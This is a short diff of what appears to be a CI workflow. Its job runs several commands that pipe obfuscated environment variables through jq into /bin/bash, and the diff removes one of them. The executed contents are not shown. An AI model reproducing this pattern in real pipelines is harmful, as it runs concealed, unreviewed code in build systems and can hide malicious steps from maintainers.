@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$aaoo5046" | jq -r .qke983 | /bin/bash
           echo $ythb7791 | jq -r .ytgvt05 | /bin/bash
           echo $y187 | jq -r .oskbd08334 | /bin/bash
-          echo $ce521 | jq -r .l06 | /bin/bash
           echo $dwr45463 | jq -r .pxa229 | /bin/bash
 
       - name: Save output
